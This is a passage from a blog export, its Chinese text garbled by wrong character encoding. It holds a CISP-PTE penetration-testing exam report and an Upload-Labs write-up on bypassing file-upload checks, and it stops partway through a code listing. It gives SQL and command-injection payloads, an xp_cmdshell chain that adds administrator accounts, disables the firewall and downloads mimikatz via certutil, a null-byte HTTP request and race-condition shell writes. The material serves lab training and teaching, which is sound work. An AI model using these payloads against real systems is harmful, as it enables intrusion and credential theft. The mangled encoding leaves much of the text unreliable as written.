%}\nâ€‹\tCISP\nã€€è€ƒè¯è¦æ±‚ï¼šéœ€è¦å·¥ä½œç»éªŒ\nã€€100åˆ°é¢˜ç›®ï¼Œå•é€‰ï¼Œå¥½åƒæ˜¯60%å°±è¿‡çº¿ã€‚\nCISSP\nã€€è€ƒè¯è¦æ±‚ï¼šéœ€è¦å·¥ä½œç»éªŒ\nã€€è€ƒè¯•æ—¶é—´6ä¸ªå°æ—¶ï¼Œæ»¡åˆ†1000åˆ†ï¼Œ700åˆ†è¿‡çº¿\nCISP-PTE\nã€€è€ƒè¯è¦æ±‚ï¼šä¸éœ€è¦å·¥ä½œç»éªŒ\nã€€å­¦ç”Ÿä¹Ÿå¯ä»¥è€ƒè¯•ï¼Œä¸“é¡¹èƒ½åŠ›é€šè¿‡å³å¯æ‹¿è¯\nã€€è€ƒè¯•é¢˜å‹ä¸ºå®¢è§‚é¢˜ã€å®æ“é¢˜ã€‚å®¢è§‚é¢˜ä¸ºå•é¡¹é€‰æ‹©é¢˜ï¼Œå…± 20 é¢˜ï¼Œæ¯ é¢˜ 1 åˆ†;å®æ“é¢˜å…± 80 åˆ†ã€‚æ€»åˆ†å…± 100 åˆ†ï¼Œå¾—åˆ° 70 åˆ†ä»¥ä¸Š(å« 70 åˆ†)ä¸ºé€šè¿‡ã€‚\n{% endblockquote %}\nä½“ç³»ç»“æ„ CISP-PTE è€ƒè¯•æ•´ä½“åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼Œä¸€éƒ¨åˆ†å•é¡¹é€‰æ‹©é¢˜ï¼Œä¸€éƒ¨åˆ†å®æ“é¢˜ï¼Œè€ƒè¯•æ—¶é—´4å°æ—¶ã€‚\n   è€ƒè¯•å†…å®¹ è€ƒè¯•å½¢å¼ è€ƒè¯•åˆ†æ•°     å®‰å…¨åŠ å›ºä¸é˜²å¾¡ å•é¡¹é€‰æ‹© 20   Webå®‰å…¨åŸºç¡€ å®æ“ 30   æ—¥å¿—ä¸æ•°æ®åˆ†æ å®æ“ 20   æ¸—é€æµ‹è¯•åŸºç¡€ å®æ“ 30    å…·ä½“æ¶‰åŠçŸ¥è¯†å¯å‚è€ƒCISP-æ”»é˜²é¢†åŸŸè€ƒè¯•ä¸­å¿ƒ\nå•é€‰é¢˜ æ¯”è¾ƒåŸºæœ¬çš„é¢˜ç›®ï¼Œä¸€äº›æ¦‚å¿µé¢˜æˆ–è€…å…¶ä»–çš„é¢˜ï¼Œä¾‹å¦‚ hacker ä¸€è¯æœ€æ—©å‡ºè‡ªå“ªé‡Œç­‰ç­‰\n###å®æ“é¢˜\nå®æ“é¢˜éƒ½æ˜¯é€šè¿‡åœ¨ä¸€ä¸ªè™šæ‹Ÿç¯å¢ƒè¿›è¡Œæ“ä½œï¼Œè™šæ‹Ÿç¯å¢ƒé‡Œé¢æä¾›äº†åŸºæœ¬éœ€è¦çš„å·¥å…·ï¼Œå­—å…¸ä¹Ÿä¼šç»™ï¼Œé¢˜ç›®ç»™çš„å¯†æ–‡åŸºæœ¬å°±æ˜¯å­—å…¸é‡Œé¢çš„ï¼Œæ‰€ä»¥ä¸å¿…æ‹…å¿ƒä»€ä¹ˆè§£ä¸å‡ºæ¥å•¥çš„é—®é¢˜\nç¬¬ä¸€é¢˜\u0026ndash;sqlæ³¨å…¥ ç¬¬ä¸€é¢˜ä¸€èˆ¬æ˜¯ sql æ³¨å…¥çš„é¢˜ï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸éœ€è¦æ‰‹æ³¨ï¼Œç›´æ¥ sqlmap è·‘ä¹Ÿå¯ä»¥ï¼Œä¸è¿‡æˆ‘è€ƒè¯•çš„æ—¶å€™å°±ç”¨æ‰‹æ³¨ï¼Œç¬¬ä¸€é¢˜ä¸‡èƒ½å¯†ç ï¼Œè¿‡æ»¤äº†orä»¥åŠæ³¨é‡Šç¬¦ï¼Œç”¨\nusername: admin' || '1 password: 1 å³å¯ç™»å½•æ‹¿åˆ°ç¬¬ä¸€ä¸ª key\nç¬¬äºŒé¢˜â€”æ–‡ä»¶ä¸Šä¼  ç¬¬äºŒé¢˜ä¸€èˆ¬æ˜¯æ–‡ä»¶ä¸Šä¼ çš„é¢˜å‹ï¼Œç›´æ¥ç”¨ 00 æˆªæ–­å°±å¯ä»¥äº†ï¼Œä¸è¿‡æˆ‘åšçš„æ—¶å€™è²Œä¼¼è¿˜æ£€æŸ¥äº†æ–‡ä»¶å†…å®¹ï¼Œevalè·Ÿassertå…³é”®å­—éƒ½è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ç›´æ¥ç”¨systemç›´æ¥è¯»å–çš„ key.php\nç¬¬ä¸‰é¢˜\u0026ndash;æ–‡ä»¶åŒ…å« è¿™é¢˜å½“æ—¶æˆ‘å½»åº•é™·å…¥äº† php æœ¬åœ°åŒ…å«çš„æ´é‡Œå»äº†ï¼ŒåŠ ä¸Šå¹³æ—¶æˆ‘éƒ½æ˜¯cpçš„ payload ï¼ˆä¸è¦é—®æˆ‘ä¸ºä»€ä¹ˆè¿™ä¹ˆæ‡’ï¼Œè¿™æ ·å¿«ä¹Ÿæ¯”è¾ƒæ–¹ä¾¿â€¦ï¼‰å¯¼è‡´è‡ªå·±è€ƒè¯•çš„æ—¶å€™æ¯”è¾ƒæ™•ä¹Ÿæ€€ç–‘è‡ªå·±çš„ payload æ˜¯ä¸æ˜¯å†™é”™äº†\nphp://filter/read=convert.base64-encode/resource=key.php ä½†æ˜¯ä¸€ç›´åšä¸å‡ºæ¥\u0026hellip;æˆ‘ä¹Ÿè§‰å¾—ä¸å¯èƒ½è¿™ä¹ˆéš¾å§\nè€ƒå®Œè¯•æˆ‘å»é—®äº†ä¸€ä¸‹å‡ºé¢˜çš„ï¼Œä»–è¯´æ˜¯æºä»£ç é‡Œé¢æœ‰åé—¨æ–‡ä»¶æç¤ºï¼Ÿï¼Ÿï¼Ÿ\nWTFï¼Ÿï¼Ÿï¼ŸEXMï¼Ÿï¼Ÿï¼Ÿ\nå‘è¿˜æ˜¯æ„Ÿè§‰æœ‰ç‚¹å‘çš„ï¼Œä¸è¿‡è¿˜æ˜¯è§‰å¾—è‡ªå·±ä¸ç»†å¿ƒå¯¼è‡´æ²¡åšå‡ºæ¥çš„å§\u0026hellip;\né—®äº†åŒå­¦ï¼Œview.htmlæœ‰åé—¨æç¤ºï¼Œç›´æ¥è¿ä¸Šå»å°±è¡Œäº†ã€‚ã€‚WTMD!\nç¬¬å››é¢˜\u0026ndash;å‘½ä»¤æ‰§è¡Œ å¾ˆç®€å•çš„å‘½ä»¤æ³¨å…¥çš„ä¸€é“é¢˜ï¼Œç”¨;æˆ–è€…å…¶ä»–å‘½ä»¤åˆ†éš”ç¬¦ç»•è¿‡å°±è¡Œäº†ï¼Œä½†æ˜¯ä¼šå±è”½ä¸€äº›è¯»å–æ–‡ä»¶çš„å‘½ä»¤ï¼Œè¯¸å¦‚catã€moreç­‰\næœ€åå¿˜äº†æ˜¯é€šè¿‡ç”¨tailè¿˜æ˜¯ä¸‹é¢è¿™ä¸ª payload ç»•è¿‡äº†\n127.0.0.1;curl file:///var/www/html/key.php ç¬¬äº”é¢˜\u0026ndash;æ—¥å¿—å®¡è®¡ æˆ‘è§‰å¾—å¾ˆåäººç±»çš„ä¸€é“é¢˜ï¼Œç»™ä½ ä¸€ä¸ªå‡ MBçš„æ—¥å¿—æ–‡ä»¶ï¼Œç„¶åè®©ä½ è‚‰çœ¼å®¡è®¡å‘ç°åé—¨\u0026hellip;ä¸»è¦æ˜¯é‚£ä¸ªè™šæ‹Ÿç¯å¢ƒä¸æ˜¯å¾ˆå¥½ï¼Œåªæœ‰ Notepad++ ï¼Œæˆ‘ç›´æ¥æ”¾äº†ï¼Œçœ‹å¾—çœ¼ç›éƒ½ç–¼ã€‚\nå¦‚æœè¦åšçš„è¯ï¼Œç›´æ¥è·Ÿ 200 çš„ HTTP çŠ¶æ€ç æ¥ç€å®¡è®¡å°±å·®ä¸å¤šäº†\u0026hellip;\nç¬¬å…­é¢˜\u0026ndash;ç»¼åˆæ¸—é€ ä¸€ä¸ª windows + IIS + mssql çš„ç¯å¢ƒï¼Œå¾¡å‰‘æ‹¿åˆ° www.zip ï¼Œç„¶åæ‹¿åˆ°æ•°æ®åº“å¯†ç ï¼Œç›´æ¥ç”¨æ•°æ®åº“è¿æ¥å·¥å…·è¿ä¸Šå»ï¼Œå‘ç° key7ï¼Œæ‰¾åˆ°ç®¡ç†å‘˜å¯†ç ï¼Œç„¶åè·‘ md5 æ‰¾åˆ°æ˜æ–‡ï¼Œç™»å½•åå°æ‹¿åˆ° key6ã€‚åé¢çœ‹å…¶ä»–å¸ˆå‚…çš„ä¸€èˆ¬å¥—è·¯æ˜¯ç”¨\nEXEC sp_configure 'show advanced options',1; (è®°å¾—reconfigure) reconfigure EXEC sp_configure 'xp_cmdshell',1;ï¼ˆè®°å¾—reconfigureï¼‰å¯ç”¨xp_cmdshell reconfigure exec xp_cmdshell 'dir c:\\ /s /b |findstr \u0026quot;key\u0026quot;|findstr \u0026quot;txt\u0026quot;'; æ‰¾åˆ°keyçš„ä½ç½® exec xp_cmdshell 'type keyä½ç½®\u0026quot;'; ç›´æ¥è¯»keyå†…å®¹ï¼Œä¸è¿‡ä¸€èˆ¬ä¸ä¼šè®©ä½ æœ‰ç›´æ¥è¯»çš„æƒé™ exec xp_cmdshell 'cacls c:\\ /s /b |findstr \u0026quot;key\u0026quot;|findstr \u0026quot;txt\u0026quot; /E /G adminstrator:F'; æ”¹å˜æ–‡ä»¶æ“ä½œæƒé™ï¼ŒFæ˜¯æ‰€æœ‰æƒé™ï¼Œæ”¹å˜æƒé™åå†è¯»å°±èƒ½æˆåŠŸ exec xp_cmdshell 'certutil -urlcache -f -split http://æœ¬æœº:8000/3389.exe'; è¿™é‡Œçš„certutilçš„æ–¹å¼ä¸åŸºç¡€é¢˜4ä¸­çš„curlæ€è·¯ç›¸åŒï¼Œå¯å‚è€ƒã€‚è¿™é‡Œä¸Šä¼ çš„æ˜¯å¼€å¯3389çš„å·¥å…·ã€‚ exec xp_cmdshell 'net user username password /add';exec xp_cmdshell 'net localgroup administrators username /add';åˆ›å»ºè´¦æˆ· exec master..xp_cmdshell 'net localgroup administrators test add' exec xp_cmdshell 'netsh firewall set opmode disable'; å¦‚æœç›®æ ‡å¼€äº†é˜²ç«å¢™ï¼Œé‚£ä¹ˆå³ä½¿å¼€å¯3389ç«¯å£ä¹Ÿæ— æ³•è¿æ¥ï¼Œè¿™æ¡å‘½ä»¤ç”¨äºå…³é—­é˜²ç«å¢™ã€‚ exec xp_cmdshell 'certutil -urlcache -f -split http://æœ¬æœº:8000/mimikazts.exe';å¦‚æœä¸èƒ½å»ºç«‹è´¦æˆ·ï¼Œé‚£ä¹ˆéœ€è¦å·¥å…·å»ç ´è§£ç³»ç»Ÿè´¦æˆ·çš„å¯†ç ã€‚è¿™é‡Œä½¿ç”¨çš„mimikaztsã€‚ exec master..xp_cmdshell 'dir \u0026quot;C:\\Documents and Settings\\Administrator\\æ¡Œé¢\\\u0026quot; /A -D /B' exec xp_cmdshell 'type \u0026quot;C:\\Documents and Settings\\Administrator\\æ¡Œé¢\\key.txt\u0026quot;' æœ€åæˆ‘é€šè¿‡xp_cmdshellæ‰§è¡Œå‘½ä»¤æ²¡æœ‰å‘ç° key8ï¼Œé—®äº†ä¸€ä¸‹äººå®¶è¯´æ˜¯è¦é€šè¿‡è¿œç¨‹è¿‡å»â€¦åšæ³•æ˜¯é€šè¿‡å†™ä¸€ä¸ªä¸€å¥è¯ï¼Œä¸Šä¼ ä¸€ä¸ªç±»ä¼¼ mimikatz çš„å·¥å…·ï¼Œç›´æ¥æŠ“ Administrator çš„å¯†ç ï¼Œé€šè¿‡ reduh è¿›è¡Œ rdp è½¬å‘ï¼Œå†è¿è¿œç¨‹ï¼Œåœ¨æ¡Œé¢å¯ä»¥çœ‹åˆ° key8\nConclusion ä¸ªäººæ„Ÿè§‰è¿™æ˜¯æœ€å¤±è´¥çš„ä¸€æ¬¡â€¦å› ä¸ºç¬¬ä¸‰é¢˜æ„Ÿè§‰çœŸçš„æ˜¯â€¦æœ‰ç‚¹å‘ï¼Œä¹Ÿæ€ªè‡ªå·±ä¸å¤ªå°å¿ƒã€‚ç¬¬å››é¢˜å› ä¸ºçœŸçš„çœ‹å¾—çœ¼ç›éš¾å—ä¸æƒ³çœ‹äº†ã€‚æœ€åä¸€ä¸ª key ç¡®å®éœ€è¦ä¸€ç‚¹æŠ€å·§ï¼Œè‡ªå·±åœ¨å†…ç½‘æ¸—é€è¿™æ–¹é¢ç»éªŒç€å®å°‘ï¼Œåæ¥ä¹Ÿå­¦ä¹ äº†ä¸€äº›å§¿åŠ¿ã€‚ä½†æ˜¯è¿™ç¯å¢ƒçœŸçš„æ˜¯å¡å¾—ä¸€æ‰¹ï¼Œå¦ä¸€ä¸ªè·Ÿæˆ‘ä¸€èµ·è€ƒçš„å¸ˆå‚…ä¹Ÿæ˜¯å¾ˆæƒ³åæ§½è¿™ä¸€ç‚¹ï¼Œç„¶åæˆ‘ä»¬åŒæ–¹è¾¾æˆäº†å…±è¯†â€”â€”ä¸ºä»€ä¹ˆè¦è€ƒ4å°æ—¶ï¼Œæ˜æ˜ä¸€å°æ—¶å¤šå°±å¯ä»¥è§£å†³çš„é—®é¢˜éƒ½æ˜¯å› ä¸ºç»™æœºå™¨æ‹–æ²“çš„â€¦å“ï¼Œè™½ç„¶æ„Ÿè§‰è¿‡ä¸å»ï¼Œä½†æ˜¯æ„Ÿè§‰è‡ªå·±ä¹Ÿå°½åŠ›äº†å§ã€‚ä¹Ÿæœ‰äº›æƒ…æœ‰å¯åŸçš„åœ°æ–¹ï¼Œ8ç‚¹åŠçš„è€ƒè¯•ï¼Œæˆ‘7ç‚¹èµ·ï¼Œæ—©èµ·å‚»ä¸€å¤©ï¼ˆæ‰‹åŠ¨ç‹—å¤´ã€‚\nè™½ç„¶æœ‰ç‚¹æ„Ÿè§‰æš´èºï¼ŒåŸæœ¬å¯ä»¥è½»è½»æ¾æ¾è¿‡äº†çš„ï¼Œç»“æœå¯èƒ½æ²¡è¿‡ï¼Œä½†æ˜¯è¿˜æ˜¯å­¦åˆ°äº†ä¸€äº›å§¿åŠ¿å§ã€‚æ— è®ºç»“æœå¦‚ä½•ï¼Œè¿˜æ˜¯å®‰æ…°è‡ªå·±å­¦åˆ°äº†ä¸œè¥¿å°±å¥½ï¼Œåæ­£è€ƒè¯•åˆ¸å…è´¹çš„hhhh\nReference cisp-pteè€ƒè¯•è¦ç‚¹æ€»ç»“\nCISP-PTE æ³¨å†Œæ¸—é€æµ‹è¯•å·¥ç¨‹å¸ˆè€ƒè¯• æ€»ç»“\u0026amp;\u0026amp;ç»éªŒåˆ†äº«\n","date":"2019-03-21T16:13:12Z","permalink":"https://blog.zeddyu.info/2019/03/21/CISP-PTE%E8%80%83%E8%AF%95%E5%88%86%E4%BA%AB/","title":"CISP-PTEè€ƒè¯•åˆ†äº«"},{"content":"The writeup of UploadLab.\nUpload-Labs Info.php ä»£ç ä¸º\n\u0026lt;?php phpinfo(); ?\u0026gt;Pass-01 éšä¾¿ä¸Šä¼ ä¸€ä¸ª shell å‘ç°å›æ˜¾\nè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ï¼Œè¯·ä¸Šä¼ .jpg|.png|.gifç±»å‹çš„æ–‡ä»¶,å½“å‰æ–‡ä»¶ç±»å‹ä¸ºï¼š.php å‘ç°æ˜¯ä¸ªå‰ç«¯æ£€æŸ¥ï¼Œæ”¹æˆ.jpgç»•è¿‡ï¼Œç”¨ burp æŠ“åŒ…å†æ”¹æˆ.phpå³å¯\nPass-02 ä¸Šä¼  info.php å‘ç°å›æ˜¾\næç¤ºï¼šæ–‡ä»¶ç±»å‹ä¸æ­£ç¡®ï¼Œè¯·é‡æ–°ä¸Šä¼ ï¼ æŠ“åŒ…å°†ä¿®æ”¹ä¸Šä¼ æ–‡ä»¶å­—æ®µ:\nContent-Type: image/jpeg Pass-03 ä¸Šä¼  info.php å‘ç°å›æ˜¾\næç¤ºï¼šä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼ é»‘åå•ç»•è¿‡ï¼Œå°†åç¼€åæ”¹æˆ\nfilename=\u0026quot;shell.php5\u0026quot; apache çš„httpd.confä¸­æœ‰å¦‚ä¸‹é…ç½®ä»£ç \nAddType application/x-httpd-php .php .phtml .phps .php5 .pht Pass-04 ä¸Šä¼  info.php å‘ç°å›æ˜¾\næ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ ! ä½†æ˜¯ä¸Šä¼ ä¸€ä¸ªå›¾ç‰‡å‘ç°æ˜¯æ²¡æœ‰æ”¹æ–‡ä»¶åçš„ã€‚çœ‹ä»£ç å‘ç°å‡ ä¹æ‰€æœ‰èƒ½ç”¨çš„åç¼€åéƒ½è¿›äº†é»‘åå•ï¼Œå”¯ç‹¬æ²¡æœ‰.htaccessï¼Œäºæ˜¯æˆ‘ä»¬å¯ä»¥ä¸Šä¼ .htaccessï¼Œæ–‡ä»¶å†…å®¹å¦‚ä¸‹\nSetHandler application/x-httpd-php å¯ä»¥å°†å½“å‰ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶éƒ½å½“ä½œ php æ–‡ä»¶å¤„ç†ï¼Œè¿™æ—¶å€™ä¼ ä¸ªæ”¹äº†åç¼€çš„ php æ–‡ä»¶å°±å¥½\nPass-05 è™½ç„¶.htaccessè¢«è¿‡æ»¤äº†ï¼Œä½†æ˜¯å®¡è®¡ä»£ç å‘ç°è½¬æ¢å¤§å°å†™ï¼Œå¯ä»¥ç”¨å¤§å°å†™ç»•è¿‡\nfilename=\u0026quot;info.PHP\u0026quot; Pass-06 å‘ç°å°‘äº†trim()å‡½æ•°ï¼Œæ²¡æœ‰è¿›è¡Œå»ç©ºå¤„ç†ï¼Œåç¼€åŠ ä¸ªç©ºæ ¼å°±å¥½äº†\nfilename=\u0026quot;info.php \u0026quot; Pass-07 å‘ç°æ²¡æœ‰å»é™¤æœ«å°¾çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨info.php.æ¥ç»•è¿‡ï¼Œåœ¨ windows ç¯å¢ƒä¸‹ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„.\nPass-08 å‘ç°æ²¡æœ‰å»é™¤::$DATAï¼Œå¯ä»¥åœ¨æœ«å°¾æ·»åŠ ::$DATAï¼Œè¿™ä¸ªåœ¨ windows ç¯å¢ƒä¸‹ä¹Ÿä¼šè§£æã€‚\nPass-09 è¿™é‡Œç”¨info.php. .ç»•è¿‡ï¼Œæ³¨æ„ä¸­é—´æœ‰ä¸€ä¸ªç©ºæ ¼ã€‚\n$file_name = trim($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]);\t//info.php. . $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹\t//info.php.ç©ºæ ¼  if (!in_array($file_ext, $deny_ext)) { $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;];\t$img_path = UPLOAD_PATH.\u0026#39;/\u0026#39;.$file_name;\t// UPLOAD_PATH/.info.php.ç©ºæ ¼ } åŒæ ·ï¼Œwindows ç¯å¢ƒä¸‹è‡ªåŠ¨å¿½ç•¥æœ«å°¾çš„.ä¸ç©ºæ ¼\nPass-10 ç½®æ¢äº†å…³é”®å­—ï¼Œå¯ä»¥åŒå†™ç»•è¿‡ï¼Œä½†æ˜¯æ³¨æ„é¡ºåºï¼Œä¾‹å¦‚info.pphphpï¼Œå› ä¸ºphphppè¿™æ ·ä¼šç½®æ¢ç¬¬ä¸€ä¸ªphpä¸ºç©ºï¼Œå°±å½¢æˆäº†åç¼€.hpp\nPass-11 $is_upload = false; $msg = null; if(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_ext = substr($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],strrpos($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;],\u0026#34;.\u0026#34;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $img_path = $_GET[\u0026#39;save_path\u0026#39;].\u0026#34;/\u0026#34;.rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else { $msg = \u0026#39;ä¸Šä¼ å‡ºé”™ï¼\u0026#39;; } } else{ $msg = \u0026#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\u0026#34;; } } ä»æºä»£ç å¯ä»¥å‘ç°ï¼Œè™½ç„¶ç”¨äº†ç™½åå•æ¨¡å¼ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä¸Šä¼ è·¯å¾„ï¼Œåˆ©ç”¨CVE-2015-2348è¿›è¡Œ 00 æˆªæ–­\næ¼æ´å½±å“ç‰ˆæœ¬å¿…é¡»åœ¨5.4.x\u0026lt;= 5.4.39ï¼Œ5.5.x\u0026lt;= 5.5.23ï¼Œ5.6.x \u0026lt;= 5.6.7\nPOST /Pass-11/index.php?save_path=../upload/test.php%00 HTTP/1.1 Host: localhost:8002 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://localhost:8002/Pass-11/index.php Content-Type: multipart/form-data; boundary=---------------------------1397349150366000458976532598 Content-Length: 356 Connection: close Upgrade-Insecure-Requests: 1 -----------------------------1397349150366000458976532598 Content-Disposition: form-data; name=\u0026#34;upload_file\u0026#34;; filename=\u0026#34;info.jpg\u0026#34; Content-Type: text/php \u0026lt;?php phpinfo(); ?\u0026gt; -----------------------------1397349150366000458976532598 Content-Disposition: form-data; name=\u0026#34;submit\u0026#34; ä¸Šä¼  -----------------------------1397349150366000458976532598-- Pass-12 åªæ˜¯æŠŠ11ä¸­çš„è·¯å¾„æ”¹æˆäº†$_POST['save_path']ï¼Œæ–¹æ³•æ— å¼‚\nPass-13 æ‰¾å‡ ä¸ª png ã€ jpg æˆ–è€… gif å›¾ç‰‡ç›´æ¥ç”¨echo \u0026quot;\u0026lt;?php phpinfo();?\u0026gt;\u0026quot; \u0026gt;\u0026gt; xxx.jpgå°±å¯ä»¥åšæˆå›¾ç‰‡é©¬äº†ï¼Œç›´æ¥ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å³å¯\nPass-14 å’Œ13ä¸€æ ·ï¼Œåªä¸è¿‡13 check å‰é¢ä¸¤å­—èŠ‚çš„æ•°æ®å¤´ï¼Œ14ç”¨äº†ä»¥ä¸‹ä»£ç æ›´ä¸ºä¸¥æ ¼ï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨13çš„æ–¹æ³•æ˜¯åœ¨å›¾ç‰‡æœ«å°¾è¿½åŠ çš„ä»£ç æ®µï¼Œæ•´ä¸ªå›¾ç‰‡è¿˜æ˜¯ä¸ªå®Œæ•´çš„å›¾ç‰‡æ²¡æœ‰è¢«ç ´åï¼Œä¹Ÿå°±ç»•è¿‡äº†æ£€æµ‹\n$info = getimagesize($filename); $ext = image_type_to_extension($info[2]); Pass-15 åŒ14å…³\nPass-16 è¯¦ç»†å‚è€ƒupload-labsä¹‹pass 16è¯¦ç»†åˆ†æ\nè¿™é‡Œè€ƒå¯Ÿçš„æ˜¯äºŒæ¬¡æ¸²æŸ“çš„ç»•è¿‡ï¼Œç”¨ GIF ç»•è¿‡ä¼šç›¸å¯¹æ¯”è¾ƒç®€å•ï¼Œç›´æ¥åœ¨GIF98aä¸‹é¢åŠ å…¥ php ä»£ç å³å¯\nPass-17 æ¯”è¾ƒå…¸å‹çš„æ¡ä»¶ç«äº‰\nif(isset($_POST[\u0026#39;submit\u0026#39;])){ $ext_arr = array(\u0026#39;jpg\u0026#39;,\u0026#39;png\u0026#39;,\u0026#39;gif\u0026#39;); $file_name = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;name\u0026#39;]; $temp_file = $_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;tmp_name\u0026#39;]; $file_ext = substr($file_name,strrpos($file_name,\u0026#34;.\u0026#34;)+1); $upload_file = UPLOAD_PATH . \u0026#39;/\u0026#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . \u0026#39;/\u0026#39;. rand(10, 99).date(\u0026#34;YmdHis\u0026#34;).\u0026#34;.\u0026#34;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \u0026#34;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼\u0026#34;; unlink($upload_file); } }else{ $msg = \u0026#39;ä¸Šä¼ å‡ºé”™ï¼\u0026#39;; } } ä»ä»£ç çœ‹ï¼Œå› ä¸ºå…ˆç§»åŠ¨æ–‡ä»¶åˆ° upload æ–‡ä»¶å¤¹ç„¶ååˆ¤æ–­åç¼€å†åˆ é™¤ï¼Œæ˜¯å¯ä»¥é€šè¿‡ä¸€å®šçš„æ—¶é—´å·®æ¥è®¿é—®è‡ªå·±ä¸Šä¼ çš„æ–‡ä»¶å¯¼è‡´å†™å…¥ shell çš„ã€‚å¯ä»¥ä¸Šä¼ \n\u0026lt;?php file_put_contents(\u0026#34;shell.php\u0026#34;,\u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34;);?\u0026gt;è¿™æ ·åªè¦ä¸€æ¬¡è®¿é—®æˆåŠŸè¯¥ php æ–‡ä»¶ï¼Œå³å¯æ‹¿åˆ° shell\n \nPass-18 ä¸17é—®é¢˜ç±»ä¼¼ï¼Œåœ¨ç§»åŠ¨åå†æ”¹åå¯èƒ½è¢«ä¼šæœ‰æ¡ä»¶ç«äº‰çš„æ¼æ´\n// if we are here, we are ready to move the file to destination  $ret = $this-\u0026gt;move(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } // check if we need to rename the file  if( $this-\u0026gt;cls_rename_file == 1 ){ $ret = $this-\u0026gt;renameFile(); if( $ret != 1 ){ return $this-\u0026gt;resultUpload( $ret ); } } è®²é“ç†è¿™é‡Œæˆ‘çœ‹å¾ˆå¤šå¸ˆå‚…ç”¨çš„æ˜¯ä¼ å›¾ç‰‡é©¬ï¼Œä½†æ˜¯éœ€è¦åˆ©ç”¨åˆ°æ–‡ä»¶åŒ…å«ï¼Œè€Œä½œè€…æ„æ€æˆ‘è§‰å¾—è‚¯å®šä¸æ˜¯è¿™æ ·çš„ï¼Œå¦åˆ™ç”¨ç«äº‰æ¥å¹²å˜›ï¼Ÿç›´æ¥ä¼ ä¸ªå›¾ç‰‡é©¬ä¸å°±å¥½äº†ï¼Œåæ­£æœ€åéƒ½ä¼šè¿”å›æ–‡ä»¶åã€‚\nè¿™é‡Œä¸ªäººè§‰å¾—é¢„æœŸè§£æ˜¯é€šè¿‡ Apache è§£ææ¼æ´æ¥é…åˆæ¡ä»¶ç«äº‰åˆ©ç”¨çš„ã€‚\n â€‹\tApache è§£ææ–‡ä»¶çš„è§„åˆ™æ˜¯ä»å³åˆ°å·¦å¼€å§‹åˆ¤æ–­è§£æ,å¦‚æœåç¼€åä¸ºä¸å¯è¯†åˆ«æ–‡ä»¶è§£æ,å°±å†å¾€å·¦åˆ¤æ–­ã€‚æ¯”å¦‚ test.php.owf.rar â€œ.owfâ€å’Œâ€.rarâ€ è¿™ä¸¤ç§åç¼€æ˜¯apacheä¸å¯è¯†åˆ«è§£æ,apacheå°±ä¼šæŠŠwooyun.php.owf.rarè§£ææˆphpã€‚\n æ‰€ä»¥æˆ‘ä»¬ä¼ ä¸ª.php.7zä¸ºåç¼€çš„æ–‡ä»¶ï¼Œå†é€šè¿‡æ¡ä»¶ç«äº‰å»è®¿é—®è¿™ä¸ªæ–‡ä»¶å°±å¯ä»¥å†™å…¥ shell äº†ã€‚\nPass-19 åˆ©ç”¨pathinfoçš„ç‰¹æ€§ç»•è¿‡\nvar_dump(pathinfo(\u0026#34;/testweb/test.txt/.\u0026#34;,PATHINFO_EXTENSION)); string(0) \u0026#34;\u0026#34; var_dump(pathinfo(\u0026#39;/testweb/test.php\\00.jpg\u0026#39;,PATHINFO_EXTENSION)); string(3) \u0026#34;jpg\u0026#34; å½“ç„¶ä¹Ÿå¯ä»¥åˆ©ç”¨\\00ç»•è¿‡ï¼Œmove_uploaded_fileä¼šå¿½ç•¥åé¢çš„.jpg\nPass-20 æºä»£ç \n$is_upload = false; $msg = null; if(!empty($_FILES[\u0026#39;upload_file\u0026#39;])){ //æ£€æŸ¥MIME  $allow_type = array(\u0026#39;image/jpeg\u0026#39;,\u0026#39;image/png\u0026#39;,\u0026#39;image/gif\u0026#39;); if(!in_array($_FILES[\u0026#39;upload_file\u0026#39;][\u0026#39;type\u0026#39;],$allow_type)){ $msg = \u0026#34;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!\u0026#34;; }else{ 